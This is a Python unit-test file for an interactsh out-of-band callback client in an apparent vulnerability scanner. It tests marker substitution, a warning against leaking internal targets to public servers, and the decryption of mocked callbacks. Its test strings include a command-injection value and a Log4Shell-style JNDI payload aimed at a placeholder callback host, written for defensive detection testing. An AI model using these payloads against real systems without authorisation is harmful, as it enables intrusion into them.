"""OOB(interactsh) 클라이언트 단위 테스트 — 네트워크 없이 서버측을 mock 해 register→mint→
poll→복호 전 과정을 검증. 크립토(RSA-OAEP-SHA256 + AES-256-CFB)가 interactsh-server 스킴과
일치하는지가 핵심."""
import base64
import json
import os
import asyncio

import pytest

from core import oob


def _run(coro):
    return asyncio.run(coro)


@pytest.fixture(autouse=True)
def _reset(monkeypatch):
    # 매 테스트 새 클라이언트 + OOB 활성화
    oob._client = None
    monkeypatch.setenv("OOB_ENABLED", "true")
    monkeypatch.setenv("OOB_SERVER", "https://oob.example.com")
    monkeypatch.setenv("OOB_DOMAIN", "oob.example.com")
    monkeypatch.delenv("OOB_TOKEN", raising=False)
    yield
    oob._client = None


# ── 템플릿 치환 ────────────────────────────────────────────────────────────────
def test_marker_detect_and_substitute():
    assert oob.has_marker("http://t/x?u={{oob}}", "", "")
    assert oob.has_marker("", "cmd=;nslookup {{OOB}}", "")
    assert not oob.has_marker("http://t/x", "a=b", "")
    assert oob.substitute("${jndi:ldap://{{oob}}/a}", "abc.oob.example.com") == \
        "${jndi:ldap://abc.oob.example.com/a}"


# ── 내부 타깃 ↔ 공개 서버 유출 가드 ──────────────────────────────────────────────
def test_leak_guard_internal_target_public_server(monkeypatch):
    monkeypatch.setenv("OOB_SERVER", "https://oast.fun")
    monkeypatch.delenv("OOB_DOMAIN", raising=False)
    assert oob.is_public_server()
    assert oob.target_is_internal("http://192.168.0.10/x")
    assert oob.target_is_internal("http://intranet.corp/x")
    assert oob.target_is_internal("http://localhost:8080/")
    assert oob.leak_warning("http://10.0.0.5/api")          # 경고 발생
    assert not oob.leak_warning("http://public.example.com/")  # 외부 타깃엔 경고 없음


def test_leak_guard_selfhost_no_warning(monkeypatch):
    monkeypatch.setenv("OOB_SERVER", "https://oob.mycorp.com")  # 공개 아님(self-host)
    assert not oob.is_public_server()
    assert not oob.leak_warning("http://192.168.0.10/x")     # self-host 면 내부 타깃도 경고 없음


# ── register → mint → poll → 복호 (서버측 mock) ──────────────────────────────────
def _fake_client(monkeypatch):
    """interactsh-server 를 흉내내는 fake httpx.AsyncClient — register 에서 받은 공개키로
    poll 응답을 실제 스킴대로 암호화해 돌려준다."""
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
    from core.oob import CFB
    state = {"pub": None}

    class _Resp:
        def __init__(self, code, payload):
            self.status_code = code; self._p = payload
        def json(self): return self._p

    class _Client:
        def __init__(self, *a, **k): pass
        async def __aenter__(self): return self
        async def __aexit__(self, *a): return False
        async def post(self, url, json=None, headers=None):
            state["pub"] = serialization.load_pem_public_key(
                base64.b64decode(json["public-key"]))
            return _Resp(200, {"message": "registration successful"})
        async def get(self, url, params=None):
            interaction = {"protocol": "dns", "unique-id": state["uid"],
                           "full-id": state["uid"] + ".oob.example.com",
                           "q-type": "A", "raw-request": "A? " + state["uid"],
                           "remote-address": "203.0.113.9", "timestamp": "2026-01-01T00:00:00Z"}
            aes_key = os.urandom(32); iv = os.urandom(16)
            enc = Cipher(algorithms.AES(aes_key), CFB(iv)).encryptor()
            ct = iv + enc.update(json_dumps(interaction)) + enc.finalize()
            enc_key = state["pub"].encrypt(aes_key, padding.OAEP(
                mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
            return _Resp(200, {"data": [base64.b64encode(ct).decode()],
                               "aes_key": base64.b64encode(enc_key).decode()})

    def json_dumps(o): return json.dumps(o).encode()
    monkeypatch.setattr(oob.httpx, "AsyncClient", _Client)
    return state


def test_mint_and_poll_decrypt(monkeypatch):
    state = _fake_client(monkeypatch)
    host = _run(oob.mint({"payload": "nslookup {{oob}}", "url": "http://t/x"}))
    assert host and host.endswith(".oob.example.com")
    uid = host.split(".")[0]
    state["uid"] = uid                       # 서버가 이 마커로 콜백이 왔다고 응답하게
    inters = _run(oob.poll())
    assert len(inters) == 1
    it = inters[0]
    assert it["protocol"] == "DNS"
    assert it["remote_address"] == "203.0.113.9"
    assert it["context"]["payload"] == "nslookup {{oob}}"   # 마커→요청 컨텍스트 매핑
    # 같은 콜백은 중복 제거
    assert _run(oob.poll()) == []


def test_apex_domain_callback_without_marker(monkeypatch):
    class _Resp:
        status_code = 200

        def __init__(self, payload):
            self.payload = payload

        def json(self):
            return self.payload

    class _Client:
        def __init__(self, *args, **kwargs):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return False

        async def post(self, *args, **kwargs):
            return _Resp({"message": "registration successful"})

        async def get(self, *args, **kwargs):
            def event(host):
                return json.dumps({"protocol": "http", "full-id": host,
                                   "raw-request": f"GET /test Host: {host}",
                                   "remote-address": "203.0.113.9",
                                   "timestamp": "2026-01-01T00:00:00Z"})
            return _Resp({"data": [], "tlddata": [event("oob.example.com"),
                                                   event("other.oob.example.com")]})

    monkeypatch.setattr(oob.httpx, "AsyncClient", _Client)
    interactions = _run(oob.poll())  # polling registers even without {{oob}}
    assert len(interactions) == 1
    assert interactions[0]["full_id"] == "oob.example.com"
    assert interactions[0]["context"] == {"direct_domain": True}
    assert _run(oob.poll()) == []


def test_disabled_returns_nothing(monkeypatch):
    monkeypatch.setenv("OOB_ENABLED", "false")
    assert not oob.enabled()
    assert _run(oob.mint({})) is None
    assert _run(oob.poll()) == []
